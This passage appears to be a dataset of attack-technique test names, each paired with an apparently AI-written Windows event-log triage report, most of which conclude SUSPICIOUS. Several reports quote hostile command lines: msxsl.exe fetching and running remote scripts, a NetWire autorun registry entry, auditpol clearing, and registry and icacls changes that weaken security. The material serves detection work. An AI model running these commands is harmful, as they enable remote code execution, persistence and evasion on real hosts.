   - Review any changes potentially made to system logs by `wevtutil.exe`.

3. **Actionable Steps:**
   - If malicious activity is detected, isolate the server for further forensics.
   - Review security patches and antivirus definitions on `Server002`.
   - Ensure users follow best practices in executing scripts, particularly under administrative accounts.

This analysis concludes that the logs indicate potentially suspicious activity that requires further review to ensure the security of the system."
MSXSL Bypass using remote files,"Upon analyzing the provided logs, I have identified the following points of concern that stand out as potentially suspicious or worthy of further investigation:

1. **PowerShell Execution**: 
   - The logs show the execution of `powershell.exe`, which is often used for both legitimate and malicious purposes. However, without further details on the specific commands executed, it is difficult to determine the intent.

2. **Command Line Execution with Remote Scripts**:
   - One of the Sysmon logs details the execution of `cmd.exe` to run an external executable `msxsl.exe` with parameters pointing to scripts hosted on GitHub:
     ```
     ""C:\\Windows\\System32\\cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\msxsl.exe"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslxmlfile.xml"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslscript.xsl""
     ```
     This execution shows that a process is attempting to fetch and execute remote scripts, which is a potential indicator of compromise (IoC), as it may be indicative of an attempt to download and execute malicious code.

3. **Edge Update Activities**:
   - There is a high frequency of activities related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). While it is typical for such services to update themselves regularly, the high volume of related logs and instances executing different parameters and hashes suggests overactivity that might need verification to ensure it's not being masqueraded for malicious purposes.

4. **Time Manipulation**:
   - The time discrepancy noted in the Security logs, where system time was changed (as seen in Event ID 4616), can sometimes indicate an attempt to cover tracks or shift timestamps related to various activities. This may need further investigation to ascertain if there are any unauthorized changes.

### Assessment and Next Steps

Based on the analysis of the logs:

- **SUSPICIOUS**: The log entries contain activities that do not seem entirely normal and align with potential indicators of malicious behavior, namely the command execution of remote scripts and the excessive frequency of Edge-related updates.
  
**Recommendations for Further Investigation**:
1. **Examine PowerShell Activity**: 
   - Review PowerShell scripts or commands executed around the noted time and verify against known good baselines.

2. **Investigate Command-Line Arguments**:
   - Investigate the command-line entry involving remote script execution from GitHub to determine its legitimacy or if it correlates with known malicious activities.

3. **Review Edge Update Process**:
   - Ascertain the legitimacy of the numerous `MicrosoftEdgeUpdate.exe` activities, ensuring they are communicating with legitimate Microsoft servers and performing genuine updates.

4. **Time Change Verification**:
   - Explore the system's time change logs to verify if they were made by authorized personnel or processes and why these changes were necessary. This can reveal attempts to alter event timelines.

5. **Conduct a Threat Hunt**:
   - Perform a broader threat hunt on Server002 to identify any other related anomalous activity or compromise signs.

By taking these steps, the ambiguous or potentially malicious indicators identified in the logs can be clarified, ensuring the security posture of the system."
Modify UseTPMPIN Registry entry,"### Detailed Analysis:

Upon examining the provided logs, several activities stand out that warrant further attention:

1. **Frequent Use of System Utilities:**
   - **Processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `reg.exe` are executed frequently,** all initiated by the user `SERVER002\\admin_test`.
   - Use of `wevtutil.exe`: Typically used for managing event logs. Multiple entries in the Sysmon logs showing the execution of `wevtutil.exe`. This could be benign during normal maintenance, but frequent usage without context can be suspicious.
   - Execution of `HOSTNAME.EXE` and `whoami.exe`: These utilities are often used for reconnaissance by attackers to gather system information. 
   - The creation of `cmd.exe` and use of the registry tool `reg.exe` to modify BitLocker policy settings (`UseTPMPIN`) without documented administrative activity represents a significant red flag.

2. **Registry Modification:**
   - A registry change was made by `cmd.exe` using `reg.exe` to add a policy under `HKLM\SOFTWARE\Policies\Microsoft\FVE`. This change alters the BitLocker settings. Such an action, especially with no clear administrative intent, can indicate an attempt at privilege escalation or malicious configuration.

3. **Integrity Level and Context:**
   - High integrity levels observed with the executed processes indicate elevated privileges. The commands were executed from a high integrity level which is suspicious if not performed by a legitimate administrator during authorized work.

4. **Time Discrepancies:**
   - Observed adjustments to system time which can often be a tactic to invalidate log timestamps or evade detection timelines.

### Assessment:

Based on the analysis:
- **Suspicious Use of System Tools**: The frequency of system utility executions and registry modification together suggest potential malicious intent rather than routine administrative tasks. Particularly concerning is the manipulation of security-related registry settings.
- **Possible Unauthorized Privileged Actions**: The logs show actions performed at a high integrity level, implying that an administrative account or someone with elevated privileges undertook these actions, raising concerns of unauthorized activity.

### Conclusion:

Given the nature of the activities and the context provided by the event logs:

**Resolution: SUSPICIOUS**

Actions such as registry modifications, multiple executions of potentially recon-related system commands, and manipulation of system settings at high privileges without a clear context of legitimate administrative tasks suggest further investigation is warranted.

### Guidance on How to Proceed:

1. **User Verification**: Check the legitimacy of `SERVER002\\admin_test` activities. Verify if any administrative tasks were scheduled or authorized during the timeframe.

2. **Management Review**: Examine who had access to `admin_test` credentials during the time of these events and whether those accounts have been used across other systems.

3. **Investigate Time Changes**: Investigate the reasons behind the time adjustment to ensure they align with legitimate service updates (e.g., Daylight Saving changes) and not an attempt to obscure activities.

4. **Harden Security Policies**: Review and possibly tighten security policies around the use of system utilities and registry editing, ensuring that such actions are logged and flagged for administrative review.

5. **Consider Further Forensic Analysis**: Use additional tools or hire a forensic analyst to conduct a deeper investigation into any possibly remaining traces of malicious activity on the system, such as hidden services or persistence mechanisms.

By taking these actions, you'll be able to determine the legitimacy of the suspicious activities and mitigate potential risks stemming from them."
Create ADS command prompt,"Upon reviewing the provided Windows event logs, I have made the following observations:

1. **Time Change Events**:
   - Events related to time changes (EventID 24 and EventID 1 in the System log), executed by `svchost.exe` using `LOCAL SERVICE` privileges, align with standard behavior for system time adjustments. These events often occur due to synchronization with an NTP server and do not inherently indicate malicious activity.

2. **Security Log Events**:
   - EventID 4672 indicates a user with the username `admin_test` was granted special privileges. This user session had privileges such as SeDebugPrivilege, which can be potentially risky if not properly controlled. However, the log does not indicate misuse of these privileges.
   - EventID 4624 and EventID 4634 logs for the `admin_test` user show normal login and logout patterns but should be monitored to ensure the access was authorized.

3. **Sysmon Log Events**:
   - The execution of **cmd.exe** with a specific command line `/c echo cmd /c echo ""Shell code execution...""` suggests an attempt to execute transient code. This could be related to obfuscation or misuse of Alternate Data Streams (ADS), which is suspicious though not conclusively malicious without further context.
   - The regular creation of processes (`conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`) by the user `admin_test` including privilege commands, should be reviewed as these might be used for reconnaissance or administration tasks—potentially by an attacker if unauthorized.
   - Notably, a `cmd.exe` instance with command line instructions directed to an ADS (`data.004_has_ads_cmd.txt:adstest.txt`), is uncommon and may indicate suspicious behavior since ADS is sometimes used to hide data or code.

4. **Process Execution Context**:
   - Several Windows utilities and tools (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) are executed by `admin_test` and operate with high integrity level. While these tools are legitimate, their usage can be flagged for detailed inspection to understand the intent, especially in a sequence suggesting scripted activities.

**Assessment**: The activity in the logs contains instances that meet specific flags for suspicious behavior, especially with the use of command line and potential obfuscation techniques leveraging ADS. While some of the behavior is common for administrative or automated scripts, without confirmation of intent, it is difficult to dismiss completely as benign.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Validate the legitimacy of the `admin_test` user and their activities. Confirm whether these actions were part of authorized administrative operations.
- Investigate the command line executed via `cmd.exe` for any unauthorized scripts or malicious payloads.
- Review security logs to ensure the observed operations align with expected and authorized behaviors.
- Monitor and audit similar command line activities and privilege escalations in the future to detect potential misuse or compromise attempts."
Hidden Window-Conhost Execution,"Upon analyzing the provided logs, I've identified several key points of interest which may indicate suspicious or potentially malicious behavior:

1. **Process Execution and Command-Line Execution:**
   - There is a process creation event for `powershell.exe` with a peculiar command-line argument: `""powershell.exe"" & {conhost.exe --headless calc.exe}`. This command seems designed to invoke `conhost.exe` with a ""headless"" parameter, which then spawns `calc.exe`. While `calc.exe` (Calculator) itself is benign, launching it through such an indirect and script-like command can be suspicious—especially given the potential for obfuscation within PowerShell commands in malicious activities.

2. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - Several instances of `wevtutil.exe` (Windows Event Utility) followed by subsequent launching of `conhost.exe` appear rather densely and rapidly within the timeframe of the logs. While these processes are part of the Windows operating system, their repeated invocation could indicate log tampering, enumeration, or efforts to cover tracks.

3. **Environment Context and User Execution:**
   - All suspicious commands are executed under the user `SERVER002\\admin_test` with high integrity levels. This might suggest administrative privileges are being leveraged either by a legitimate or unauthorized party. Additionally, the current directory for these executions is in a `Temp` directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`), which is commonly used in temporary or potentially malicious script executions.

4. **Time Changes:**
   - Interestingly, there are multiple ""time change"" records indicating the system clock has been set forward. This can sometimes be used for anti-forensics measures to confuse time-based security protocols or logging mechanisms.

5. **Windows Calculator and `conhost.exe`:**
   - Execution of `calc.exe` follows the unusual PowerShell command-line usage. The parent process is a ""headless"" `conhost.exe`, which is atypical and could suggest malicious use of a trusted utility to mask execution of a benign-looking executable.

**Assessment and Resolution:**

Based on the evidence of unusual command-line usage with PowerShell, the peculiar context of process executions, and rapid and repeated instances of system utilities being executed in potentially abnormal patterns, there is a cause for concern. The activity might denote an attempt to exploit legitimate system utilities for unintended purposes. Despite the used applications (PowerShell, conhost.exe, calc.exe) being legitimate, the method in which they are being called and the sequence suggest irregular or scripted activity.

**Resolution: SUSPICIOUS**

The identified activities are suspicious and warrant further investigation. Immediate steps include:
- Reviewing access logs and privilege allocations for the user `SERVER002\\admin_test`.
- Conducting a thorough check of recent file modifications, especially in directories used during event times.
- Assessing network activity logs from `Server002` to determine if there are any unexpected data exfiltration attempts.
- Engaging in endpoint detection and response to check for any other signs of compromise or persistence mechanisms left on the system. 

Further scrutiny should help determine if these situations are benign operational quirks or if they indicate a more sinister compromise."

#### Suspicious or Anomalous Behavior Identified:
1. **Registry Manipulation:**
   - There is clear evidence of registry manipulations initiated by a command (`cmd.exe`) that adds entries to the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` registry key. This action is typically associated with persistence mechanisms seen in malicious activity.
   - Registry entries related to `NetWire` are being added, which is a known remote administration tool (RAT) often associated with malicious activities.
   - The command executed includes registering executable files to run on startup, an indication of persistent malicious behavior: 
     ```plaintext
     cmd.exe /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f
     ```

2. **Process Execution with Potentially Malicious Intent:**
   - A series of processes (`conhost.exe`, `reg.exe`, `cmd.exe`) appear to be part of a script or command sequence to execute and set up persistence mechanisms. These processes are connected to suspicious command-line parameters for registry modification.
   - Use of the process `whoami.exe` and CMD to check user context and manipulate user-level settings indicates actions likely taken to establish unauthorized control or maintain access.

3. **Anomalous Process Initiations:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` close in time could be attempts to manipulate event logs, possibly indicative of log clearance attempts to hide tracks.

4. **Unexpected Time Stamps:**
   - Several events show discrepancies in time, evidenced by changes in `SystemTime` logs, although this can sometimes occur due to other legitimate time sync processes, it merits attention in the context of this other activity.

#### Malicious Indicators:
- **NetWire RAT Association**:
  - The mention of `NetWire`, along with registry modifications and the startup persistence script, strongly points towards an installation instance of this RAT. As a well-known threat typically used for spying and data theft, the presence of commands related to it amplifies the concern for malicious intent.

- **Privilege Escalation:**
  - There is high integrity level execution for potential administrative functions without direct administrative-level commands showing an unusual pattern for a typical user session.

### Assessment and Recommendation:
In summary, there are multiple indications within the logs of potentially malicious activities being executed, especially the registry modifications connected to `NetWire`. The scripts and command executions aligning closely with those used in establishing remote control and persistence make this incident highly concerning.

### Final Resolution: MALICIOUS

#### Next Steps:
1. **Immediate Action:**
   - Disconnect the affected host (Server002) from the network to prevent any further unauthorized access or data exfiltration.
   - Undertake a thorough scan of the system for any accompanying malicious executables or scripts related to `NetWire`.

2. **Investigate and Remediate:**
   - Analyze further logs to understand the timeline and entry vector of this malware and any potential lateral movement.
   - Remove the detected persistent registration of `NetWire` from the startup.

3. **Post-Incident Measures:**
   - Review and enhance security controls and user policies to mitigate potential similar threats.
   - Evaluate and educate the user base on safe computing practices and awareness against phishing attacks, often used to distribute RATs like `NetWire`.

4. **Consult with a Forensic Expert:**
   - Due to the severity of the detected threat, consulting a cybersecurity forensic expert to ensure complete eradication and understanding of the threat landscape is advisable."
Disable Microsoft Office Security Features,"### Detailed Analysis

Upon reviewing the provided event logs across multiple channels (Sysmon, System, Security, Application, and Windows PowerShell), several activities stand out as potentially suspicious, although they might not be conclusively malicious:

1. **Wevtutil.exe and conhost.exe Execution:**
   - In the Sysmon logs, multiple entries show the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The tool `wevtutil.exe` is used to retrieve and manage event logs, which could be benign administrative activity. However, frequent execution in close timeframes without clear context can occasionally indicate illicit activity, like tampering with event logs to cover tracks.

2. **PowerShell Script Execution:**
   - An execution of `powershell.exe` with a command line aimed at modifying registry keys related to Microsoft Office Excel security settings was logged. Modifying registry settings to alter security configurations, particularly related to macros (`VBAWarnings`) and Protected View, is commonly associated with attempts to lower defenses against potentially malicious macro-laden documents.

3. **Privilege Usage:**
   - A Security event shows a successful logon event (ID: 4624) and a subsequent token elevation with high-level privileges (ID: 4672) by the `SYSTEM` account which is typical for system-level operations. If correlated with unexpected logged activities, it could be something to scrutinize further.

4. **Microsoft Edge Update Activities:**
   - Numerous entries for `MicrosoftEdgeUpdate.exe` indicate it launched multiple times as part of an update sequence. These are likely legitimate update processes of Microsoft Edge. However, noting the number of activations, primarily as `NT AUTHORITY\SYSTEM`, should be cross-referenced with expected update behaviors in the environment.

5. **Defender Updates:**
   - System logs record successful updates for Microsoft Defender Antivirus, ensuring that security definitions are current. These entries are expected and beneficial for maintaining security posture.

6. **Service Events:**
   - Application logs indicate that Edge Update service stoppages occurred, which again could be part of the update sequence or post-update cleanup routines.

### Assessment

- **Suspicious Activity:** Modifications to registry settings via PowerShell that affect security configurations of Excel suggest an attempt to weaken document protection mechanisms. PowerShell usage, particularly with registry changes that impact security settings, can often indicate preparatory steps for further actions or attacks, like enabling malware execution through macros.
  
- **Benign/Expected Activities:** Most logs related to Windows Defender updates, Edge Update processes, and standard security log events appear as typical system maintenance activities, including successful Windows Defender updates and Edge auto-update processes.

### Resolution

Based on the analysis, I categorize the findings as **SUSPICIOUS**. The PowerShell activity targeting registry changes related to Excel security settings is of significant concern and warrants further investigation to confirm whether these changes were part of a legitimate administrative task or potential malicious activity.

### Recommendations

1. **Investigate PowerShell Usage:** Perform a deeper review of user activity associated with `admin_test` around the time of the PowerShell execution to validate if this was a sanctioned activity or indicative of a policy breach or compromise.

2. **Registry Check and Policy Reinforcement:** Verify registry settings for Office security and reinforce GPOs to ensure macro security settings haven't been improperly modified across more systems.

3. **Log Review and Monitoring:** Continue rigorous log monitoring for further anomalies, especially focusing on similar PowerShell events or administrative tool usage by non-standard system accounts.

4. **User Awareness Training:** If deemed necessary, educate users on the consequences of altering security settings and the importance of adhering to IT security policies."
Malware Masquerading and Execution from Zip File,"Upon reviewing the provided logs, a number of activities stand out, potentially indicating suspicious behavior. Here's a detailed analysis:

**1. PowerShell Activity:**
- The PowerShell scripts detailed involve the use of `Expand-Archive` to extract a ZIP file into the `C:\Users\admin_test\Downloads\data` directory, followed by the execution of a batch script, `README.cmd`.
- The command seems crafted to hide its operations, redirecting output and errors to null (`>$null 2>$null`).
- Running a batch file immediately after extracting files is a common tactic for executing malicious code. This approach is often used to execute payloads or scripts without detection.
- Additionally, the directory path that includes `..` could be an attempt at directory traversal or accessing files outside the expected directory structure.

**2. Security Log Insights:**
- There are multiple privileged tokens granted to the user `admin_test`, which carries privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While this can be normal for an admin account, it might indicate a risk if not typically used.
- The logon event from `IP Address 192.168.0.102`, with NTLM Authentication Protocol being used, could be legitimate, but needs confirmation. It is essential to verify if this IP address aligns with regular access patterns.

**3. Sysmon Log Observations:**
- Execution of `cmd.exe` and `rundll32.exe` following PowerShell scripts is noted. `rundll32` running a DLL (2.dll), initiated by `README.cmd`, is a potentially malicious indicator, as `rundll32.exe` is often used to execute DLL files, which could be anything from legitimate to malicious binaries.
- Multiple `setup.exe` executions related to updating Microsoft Edge are observed. These seem legitimate for updating software, but their timing and frequency should be verified.
- The use of `wevtutil.exe` and `conhost.exe` alongside PowerShell scripts could be an attempt to manipulate or extract event logs, which is suspicious.

**4. Windows Update Logs:**
- The system logs indicate legitimate Windows Update processes, including updates for the Microsoft Defender Antivirus. This part of the log seems benign.

**Overall Assessment:**
While the appearance of multiple legitimate software updates might confuse the analysis, the use of PowerShell to extract and execute files, suspicious obfuscation, and the launching of a DLL with `rundll32.exe` stands out as anomalous and possible malware behavior typical in a compromised system. The registered privileged token uses should be reviewed to understand the context of privilege use.

**Resolution: SUSPICIOUS**

There are indicators within these logs that the activity is abnormal and potentially malicious, suggesting that further investigation is needed. This includes examining the contents of `data.zip` and the `README.cmd` file's actual purposes. Network logs should also be reviewed to understand the access patterns from `192.168.0.102`, and analysis should continue to determine if `admin_test` account activities match regular user patterns."
Clear Windows Audit Policy Config,"After thoroughly analyzing the provided event logs, several notable activities have been identified that warrant closer inspection due to their potentially suspicious nature. Here’s a breakdown:

### Key Observations:

**System Log Analysis:**
- The Windows time was adjusted by the `svchost.exe` process. Although this could be routine behavior as part of the Windows Time Service operations, frequent time adjustments may require further context to ensure they are benign.

**Security Log Analysis:**
- Event ID 4672 indicates that the account `admin_test` had special privileges assigned (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). This itself isn't abnormal for an admin account, but it should be confirmed if `admin_test` is indeed supposed to hold these privileges.
- There are a number of Event ID 4719 entries indicating changes to audit policy by the user `admin_test`. Particularly, the logs show the removal of audit policies, which could be interpreted as an attempt to sidestep event logging and thus requires further examination.

**Sysmon Log Analysis:**
- There is a process execution log indicating the use of `cmd.exe` with the command line `auditpol /clear /y & auditpol /remove /allusers`. This activity suggests an attempt to modify or clear Windows audit policies, which is often a preliminary step attackers take to cover their tracks.
- The Sysmon log shows the execution of various system utilities (e.g., `wevtutil.exe`, `whoami.exe`, `auditpol.exe`) by the user `SERVER002\\admin_test`. The chaining of commands and execution of audit-related policies without clear administrative justification raises concerns.

### Assessment:

The logs show that administrative operations were performed that are consistent with activities associated with potential malicious activity, specifically:
- **Audit policy modifications** using `auditpol` which can be employed to reduce system visibility.
- **Elevation of privileges** or use of accounts like `admin_test` to perform various administrative tasks which may or may not align with typical role responsibilities.

### Resolution:

Given the activities identified and their potential implications, the resolution for these logs should be:

**SUSPICIOUS** - These logs reflect activities that deviate from standard operational behavior, particularly with regard to audit policy changes and potentially unchecked privilege escalations. Further investigation is needed to verify the legitimacy of these actions and the context in which they took place.

### Guidance on How to Proceed:

1. **Verify the User Account**: Confirm whether the actions carried out by `admin_test` are in line with expected behavior for that account. Is `admin_test` a new account and is there a legitimate need for such privileges and operations?

2. **Audit Policy Context**: Investigate further on why audit policies are being modified and if it aligns with standard practices or recent administrative changes.

3. **Review Command Origin**: Identify if the commands executed (particularly ones modifying audit policies) were intentional and required by legitimate administrative purposes.

4. **Increase Monitoring**: Implement enhanced monitoring on the account `admin_test` and ensure alerting for similar activity going forward.

5. **Cross-Validation**: Check for other potential compromises or deviations in behavior involving other accounts or services on `Server002`.

By following these steps, you'll be able to either confirm benign intents or uncover potential compromise requiring remediation."
Create and start VirtualBox virtual machine,"After reviewing the provided Sysmon logs, let's examine the entries for any signs of anomalous or suspicious behavior that could indicate malicious activity.

### Detailed Analysis:

1. **PowerShell Execution:**
   - EventID: 18017
     - Process: `powershell.exe` by `SERVER002\admin_test`
     - Powershell is a powerful task automation platform and a common tool both for administration and malicious activities. However, in this log, it merely appears to have been executed without any additional command line arguments or scripts provided, which is not typical for malicious activity that usually involves script execution or base64 encoded payloads.

2. **Wevtutil and Conhost Executions:**
   - We see frequent execution of `wevtutil.exe` and `conhost.exe` (Event IDs like 18021, 18025, 18029, etc.) by the same user (`SERVER002\admin_test`). The combination of these processes could indicate log manipulation or retrieval actions (common in forensic investigations or clearing evidence by threat actors). However, without additional context or commands, it's not conclusively malicious.

3. **Hostname and WhoAmI Executions:**
   - EventIDs: 18039 and 18043
     - `HOSTNAME.EXE` and `whoami.exe` executed with standard command lines. These are typically benign commands used to fetch network/computer information and user identity, respectively.

4. **VirtualBox Command:**
   - EventID: 18047
     - There is execution of `cmd.exe` with VirtualBox commands to create, modify, and start a virtual machine named ""file VM"". The command ends with `startvm`.
     - This indicates a possible virtualization activity, either administrative or suspicious if not previously defined as normal behavior for this user.

5. **Microsoft Edge Update:**
   - EventIDs: 18051, 18052, 18053
     - The sequence showing Microsoft Edge being installed or updated by the SYSTEM account suggests an automated or scheduled system update, typically benign behavior.

6. **TrustedInstaller and TiWorker:**
   - EventIDs: 18054, 18055
     - Execution of `TrustedInstaller.exe` and `TiWorker.exe`, which participate in Windows updates or configuration changes, aligns with expected system maintenance and is benign.

### Assessment of Threats:

- **Wevtutil.exe Activity:** Although frequent execution of wevtutil could be an indicator of suspicious activity, there is no conclusive evidence here without further context or commands logged.
- **VirtualBox Command:** The use of virtualization tools by `admin_test` can be considered suspicious if not standard operating procedure for this user or system, potentially indicating attempts to create isolated environments.
  
### Conclusion:

- **Overall Risk:** While some activities are potentially concerning (use of wevtutil.exe and VirtualBox), there isn’t enough evidence within these logs alone to classify them as definitely malicious.
  
- **Resolution:** **SUSPICIOUS**
  - Some actions, such as repeated wevtutil executions and VirtualBox usage, need verification whether they align with regular administrative activities.

### Guidance on Proceeding:

1. **Further Investigation:**
   - Verify the legitimacy of the `admin_test` user actions especially around virtualization and view logs to find the command line or associated scripts with the PowerShell command.
   - Check system execution policies and user permissions associated with `admin_test`.

2. **Monitor:**
   - Continually monitor for any anomalies like the frequent use of wevtutil or other administrative tools that could indicate attempts to cover tracks or escalate privileges.

3. **Contextual Review:**
   - Gather additional logs or evidence that can provide more context, such as network logs, to see if there were unusual external connections.

This approach will ensure that any potential threats are either classified better or determined as routine tasks."
Activate Windows NoControlPanel Group Policy Feature,"Upon reviewing the provided Windows event logs, the following observations have been made:

1. **Sysmon Logs**:
    - There are numerous events corresponding to legitimate Microsoft process executions, including those for `MicrosoftEdgeUpdate` and related subprocesses such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, etc., all under `NT AUTHORITY\SYSTEM`. These relate to routine Microsoft Edge updates and system maintenance tasks.
    - The executed command `whoami.exe` and `hostname.exe` appear normal and are typically used for system information retrieval, run by the user `SERVER002\admin_test`.
    - However, there's a command executed using `cmd.exe` to modify the Windows registry to hide the Control Panel (`NoControlPanel`). The command line was `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f`. This change is suspicious, as it can indicate an attempt to limit user access to system settings.

2. **Application Log**:
    - The logs mention `edgeupdate` service stoppage. This could be part of routine maintenance during updates, especially since other Edge-related activities are logged.

3. **System Log**:
    - The time synchronization with `time.windows.com` is routine and does not show signs of tampering or an anomaly.

### Assessment:
- **Suspicious Activity**: The execution of a command that adds a registry entry to hide the Control Panel (`NoControlPanel`) is unusual and suspicious, particularly if it wasn't executed intentionally by an administrator and lacks corresponding justification.
  
### Threats and Risks:
- **Registry Modification**: An unauthorized registry change to hide Control Panel might be part of tactics to prevent users or administrators from easily accessing system settings, potentially indicative of an attempt to restrict access or hide changes from local administrators.

### Guidance:
- **Further Investigation**:
  - Check if the registry change was authorized and track back to verify if there is an audit or log entry for user authorization.
  - Review other logs or sources (e.g., network traffic, user activity logs) to correlate any other potentially malicious activities.
  - Inspect the system for other signs of compromise, such as unusual processes or network connections.
  
- **Mitigation**:
  - If unauthorized, revert the registry change to its original state and monitor the system for further modifications.
  - Increase monitoring on the affected system for similar activities and possible indicators of compromise (IOCs).

### Conclusion:
Based on the logs provided and the analysis, the final resolution for this investigation is **SUSPICIOUS**, requiring further investigation to rule out potential malicious activity or confirm it as benign."
BlackByte Ransomware Registry Changes - CMD,"Upon reviewing the provided Windows event logs, there are several aspects that warrant closer examination:

1. **Commands Executed with CMD:**  
   The most suspicious aspect of these logs is the execution of the following commands within multiple instances of `cmd.exe`:
   - `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`
   - `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f`
   - `reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f`

   These registry modifications are typical of privilege escalation or persistence techniques. For example, `EnableLinkedConnections` is used to allow elevated processes to access network locations which non-elevated processes have access to, and is not a common setting for standard operation. 

2. **Usage of `wevtutil` and `conhost`:**  
   The frequent usage of `wevtutil.exe` and `conhost.exe` might suggest activity related to log clearing or process concealment tactics. However, since both processes are system utilities, their usage isn't inherently malicious but should be further reviewed to understand the context of their execution.

3. **System Time Change:**  
   In the system logs, there are modifications of the system time:
   - Changes from `2024-10-24 14:39:01.7297376` to `2024-10-24 14:39:25.2478761` and subsequently to `2024-10-24 14:39:25.2491094`. 
   - Unusual time changes could potentially indicate attempts to modify logging sequences or event creation times to disrupt an incident investigation. Such modifications can sometimes be an indicator of nefarious activity.

4. **Microsoft Edge Update Activity:**  
   There are multiple events related to Microsoft Edge Update, which generally is benign and part of routine updates. Given the frequent updates in technology environments, this could be regarded as normal behavior unless coupled with signs of unusual network activity or prior compromise signals.

**Assessment**:  
The execution of multiple administrative commands to alter system registry values related to potentially increasing privileges and changes in system time are strong indicators of anomalous and potentially malicious activity. It is highly advisable to consider this activity suspicious due to these potentially suspicious alterations in the system.

**Resolution: SUSPICIOUS**  
Based on the above considerations, the event logs indicate potentially suspicious activities that warrant further investigation. Recommended actions include:
- Analyze network traffic and deeper system state to determine any data exfiltration or further unauthorized access.
- Conduct a full audit of the system for further indicators of compromise (IoCs).
- Collaborate with system administrators to understand if any legitimate process or script led to the execution of these commands.
- Monitor the system for further similar activity and consult historical logs to identify precedents or patterns."
cacls - Grant permission to specified user or group recursively,"Upon analysis of the provided logs, here is a breakdown of observations related to potentially suspicious or malicious behavior:

### Suspicious or Anomalous Behaviors Observed:

1. **Frequent Execution of Command Prompt (cmd.exe):**
   - Multiple instances of `cmd.exe` are executed with various commands, including checks for the existence of `%%temp%%\data.001_cacls` and creation of files in a temporary directory.
   - Command line operations include directory creation and file writes, which can be part of legitimate script or task automation but can also be indicative of attempts to manipulate or create files for malicious purposes.

2. **Use of `icacls.exe`:**
   - `icacls.exe` is seen granting full access (`/grant Everyone:F`) to directories in the temp folder. This can be a red flag, suggesting file permission manipulation, potentially for persistence or unauthorized access.

3. **Execution of `wevtutil.exe`:**
   - `wevtutil.exe` is a utility to manage Windows Event Logs. Its undocumented usage might suggest an attempt to clear logs or hide activity, which is common in intrusion scenarios.

4. **Presence of Security Tool Execution:**
   - Tools like `hostname.exe` and `whoami.exe` are executed, possibly indicating system reconnaissance actions typical of attackers gathering environment information.

5. **High Integrity Level Execution by `admin_test`:**
   - The user `SERVER002\admin_test` is executing high-integrity level operations, indicating privileged execution. If this activity is unauthorized, it could signal a compromised user account.

6. **Frequent Process Creation of `conhost.exe`:**
   - There are numerous `conhost.exe` processes spawned indirectly from `cmd.exe` which is part of the Windows Console Host infrastructure. While this can be normal, the frequency and method necessitate scrutiny.

### Assessment:

The events in the logs suggest potentially suspicious behavior, with activities that are common in attacks targeting Windows environments. The combination of command-line executions, file permission manipulation, and possible log tampering indicates that further investigation is warranted.

### Final Resolution:

Given the findings and the context provided by the logs, the resolution is **SUSPICIOUS**. The behaviors indicate unusual activity that merits further investigation to rule out or confirm any potential security incidents."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"Upon reviewing the provided Windows event logs, several notable activities and behaviors have been identified that require scrutiny:

**1. PowerShell Activity:**
   - There is a significant amount of PowerShell execution with the `Invoke-BuildAndInvokeInstallUtilAssembly` command importing from a script located in the temporary directory. This PowerShell script references an assembly `data.004.dll` which is also located in a temporary directory. The script runs various actions such as installation and uninstallation commands with InstallUtil.exe via PowerShell.
   - PowerShell is a common attack vector used by malicious actors to execute scripts that are disguised as legitimate tasks. The use of the temporary directory, along with compiled code execution (by calling the .NET `InstallUtil.exe`), can often be indicators of a malicious Dropper or Post-Exploitation activity.

**2. Process Creation and Sysmon Logs:**
   - On multiple occasions, the execution of `InstallUtil.exe` and multiple .NET framework executable calls (csc.exe, cvtres.exe) via PowerShell from paths located in temporary directories suggests an unusual chain of process execution which resembles behaviors used in executing payloads hosted in temporary directories.
   - The execution paths and parent-child process relationship imply the execution of potentially harmful operations under high integrity levels (`IntegrityLevel=High`).

**3. Edge Update Executions:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` are recorded which are not necessarily suspicious by themselves. However, the context surrounding this action, such as execution with unusual command-line arguments from directories that suggest temporary or staged setups, could potentially point to misused or spoofed processes. 

**4. User Context:**
   - Several of these potentially suspicious activities, especially PowerShell and .NET-related processes, were executed under the `admin_test` user, indicating an elevated privilege operation, which further raises concern if the user context was illegitimately obtained.

**Assessment:**
Based on the findings, these logs contain several suspicious activities, including unusual PowerShell usage, potential misuse of system tools for executing scripts and binaries in a manner consistent with malicious exploitation.

**Resolution:** 
- **SUSPICIOUS**: The logs contain suspicious activities that do not definitively confirm a full-blown compromise, but they exhibit characteristics that warrant further investigation. 
- **Guidance:** 
  - Perform a thorough investigation of the `admin_test` user account for unauthorized accesses or privilege escalations.
  - Examine the contents and origin of any scripts and binaries located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\`.
